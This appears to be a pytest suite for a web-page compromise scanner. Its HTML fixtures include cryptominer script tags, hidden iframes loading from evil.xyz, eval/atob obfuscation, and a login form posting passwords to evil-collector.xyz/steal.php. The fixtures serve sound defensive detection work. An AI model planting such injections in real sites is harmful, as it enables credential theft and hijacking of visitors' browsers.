"""Tests for the IoC (Indicator of Compromise) scanner."""

from src.ioc_scanner import scan_ioc


class TestCryptominerDetection:
    def test_detects_coinhive_script(self):
        html = '<html><script src="https://coinhive.com/lib/coinhive.min.js"></script></html>'
        findings = scan_ioc(html, "https://example.com")
        assert any(f.ioc_type == "cryptominer" for f in findings)

    def test_detects_inline_miner_constructor(self):
        html = '<script>var miner = new CoinHive.Anonymous("abc"); miner.start();</script>'
        findings = scan_ioc(html, "https://example.com")
        assert any(f.ioc_type == "cryptominer" for f in findings)

    def test_detects_cryptoloot(self):
        html = '<script src="https://crypto-loot.com/lib/crlt.js"></script>'
        findings = scan_ioc(html, "https://example.com")
        assert any(f.ioc_type == "cryptominer" for f in findings)

    def test_no_false_positive_on_normal_scripts(self):
        html = '<script src="https://cdn.jquery.com/jquery-3.7.1.min.js"></script>'
        findings = scan_ioc(html, "https://example.com")
        assert not any(f.ioc_type == "cryptominer" for f in findings)


class TestHiddenIframeDetection:
    def test_detects_zero_size_iframe(self):
        html = '<iframe src="https://evil.xyz/payload" width="0" height="0"></iframe>'
        findings = scan_ioc(html, "https://example.com")
        assert any(f.ioc_type == "hidden_iframe" for f in findings)

    def test_detects_display_none_iframe(self):
        html = '<iframe src="https://evil.xyz/x" style="display:none"></iframe>'
        findings = scan_ioc(html, "https://example.com")
        assert any(f.ioc_type == "hidden_iframe" for f in findings)

    def test_ignores_same_domain_iframe(self):
        html = '<iframe src="https://example.com/embed" width="0" height="0"></iframe>'
        findings = scan_ioc(html, "https://example.com")
        assert not any(f.ioc_type == "hidden_iframe" for f in findings)

    def test_ignores_visible_iframe(self):
        html = '<iframe src="https://youtube.com/embed/abc" width="560" height="315"></iframe>'
        findings = scan_ioc(html, "https://example.com")
        assert not any(f.ioc_type == "hidden_iframe" for f in findings)


class TestObfuscatedJsDetection:
    def test_detects_eval_atob(self):
        html = '<script>eval(atob("ZG9jdW1lbnQud3JpdGU="));</script>'
        findings = scan_ioc(html, "https://example.com")
        assert any(f.ioc_type == "obfuscated_js" for f in findings)

    def test_detects_eval_fromcharcode(self):
        html = '<script>eval(String.fromCharCode(72,101,108,108,111));</script>'
        findings = scan_ioc(html, "https://example.com")
        assert any(f.ioc_type == "obfuscated_js" for f in findings)

    def test_detects_document_write_unescape(self):
        html = '<script>document.write(unescape("%3Cscript%20src%3D"));</script>'
        findings = scan_ioc(html, "https://example.com")
        assert any(f.ioc_type == "obfuscated_js" for f in findings)

    def test_detects_excessive_eval(self):
        evals = "eval(x);" * 12
        html = f"<script>{evals}</script>"
        findings = scan_ioc(html, "https://example.com")
        assert any("Excessive eval" in f.description for f in findings)

    def test_detects_long_hex_encoded_string(self):
        hex_str = "\\x61" * 25
        html = f'<script>var x = "{hex_str}";</script>'
        findings = scan_ioc(html, "https://example.com")
        assert any(f.ioc_type == "obfuscated_js" for f in findings)

    def test_no_false_positive_on_normal_js(self):
        html = '<script>var x = document.getElementById("test"); console.log(x);</script>'
        findings = scan_ioc(html, "https://example.com")
        assert not any(f.ioc_type == "obfuscated_js" for f in findings)


class TestSeoSpamDetection:
    def test_detects_hidden_external_links(self):
        html = """
        <div style="display:none">
            <a href="https://spam1.com">buy cheap</a>
            <a href="https://spam2.com">casino online</a>
            <a href="https://spam3.com">free slots</a>
            <a href="https://spam4.com">payday</a>
        </div>
        """
        findings = scan_ioc(html, "https://example.com")
        assert any(f.ioc_type == "seo_spam" for f in findings)

    def test_detects_spam_keywords_in_hidden_element(self):
        html = '<div style="visibility:hidden">buy viagra cheap cialis online casino</div>'
        findings = scan_ioc(html, "https://example.com")
        assert any(f.ioc_type == "seo_spam" for f in findings)

    def test_no_false_positive_on_visible_links(self):
        html = """
        <div>
            <a href="https://facebook.com/us">Facebook</a>
            <a href="https://twitter.com/us">Twitter</a>
            <a href="https://linkedin.com/in/us">LinkedIn</a>
        </div>
        """
        findings = scan_ioc(html, "https://example.com")
        assert not any(f.ioc_type == "seo_spam" for f in findings)


class TestCredentialHarvesting:
    def test_detects_cross_domain_login_form(self):
        html = """
        <form action="https://evil-collector.xyz/steal.php" method="POST">
            <input type="text" name="email">
            <input type="password" name="password">
            <button>Sign In</button>
        </form>
        """
        findings = scan_ioc(html, "https://example.com")
        assert any(f.ioc_type == "credential_harvest" for f in findings)
        assert any(f.severity == "critical" for f in findings)

    def test_ignores_same_domain_login_form(self):
        html = """
        <form action="https://example.com/login" method="POST">
            <input type="password" name="password">
            <button>Login</button>
        </form>
        """
        findings = scan_ioc(html, "https://example.com")
        assert not any(f.ioc_type == "credential_harvest" for f in findings)

    def test_ignores_relative_action(self):
        html = """
        <form action="/login" method="POST">
            <input type="password" name="password">
        </form>
        """
        findings = scan_ioc(html, "https://example.com")
        assert not any(f.ioc_type == "credential_harvest" for f in findings)

    def test_ignores_form_without_password(self):
        html = """
        <form action="https://other.com/search">
            <input type="text" name="q">
        </form>
        """
        findings = scan_ioc(html, "https://example.com")
        assert not any(f.ioc_type == "credential_harvest" for f in findings)


class TestDefacementDetection:
    def test_detects_hacked_by_in_title(self):
        html = "<html><head><title>Hacked by CyberGhost</title></head></html>"
        findings = scan_ioc(html, "https://example.com")
        assert any(f.ioc_type == "defacement" for f in findings)

    def test_detects_defaced_by_in_heading(self):
        html = "<h1>Defaced By TeamXyz - Your Security Is Weak</h1>"
        findings = scan_ioc(html, "https://example.com")
        assert any(f.ioc_type == "defacement" for f in findings)

    def test_detects_owned_by_in_marquee(self):
        html = "<marquee>owned by hackers - greetz to all</marquee>"
        findings = scan_ioc(html, "https://example.com")
        assert any(f.ioc_type == "defacement" for f in findings)

    def test_no_false_positive_on_normal_page(self):
        html = "<html><head><title>My Website</title></head><body><h1>Welcome</h1></body></html>"
        findings = scan_ioc(html, "https://example.com")
        assert not any(f.ioc_type == "defacement" for f in findings)


class TestSuspiciousScripts:
    def test_detects_suspicious_tld(self):
        html = '<script src="https://xk47fj.xyz/analytics.js"></script>'
        findings = scan_ioc(html, "https://example.com")
        assert any(f.ioc_type == "suspicious_script" for f in findings)

    def test_detects_random_looking_domain(self):
        html = '<script src="https://xkrtwmfnp.com/script.js"></script>'
        findings = scan_ioc(html, "https://example.com")
        assert any(f.ioc_type == "suspicious_script" for f in findings)

    def test_ignores_known_cdns(self):
        html = """
        <script src="https://cdn.jsdelivr.net/npm/vue@3"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
        """
        findings = scan_ioc(html, "https://example.com")
        assert not any(f.ioc_type == "suspicious_script" for f in findings)

    def test_ignores_same_domain_scripts(self):
        html = '<script src="https://example.com/app.js"></script>'
        findings = scan_ioc(html, "https://example.com")
        assert not any(f.ioc_type == "suspicious_script" for f in findings)


class TestCleanPage:
    def test_clean_html_returns_no_iocs(self):
        html = """
        <html>
        <head><title>Normal Page</title></head>
        <body>
            <h1>Welcome to our website</h1>
            <p>This is a normal page with no issues.</p>
            <a href="/about">About</a>
            <script src="https://cdn.jquery.com/jquery.min.js"></script>
        </body>
        </html>
        """
        findings = scan_ioc(html, "https://example.com")
        assert len(findings) == 0
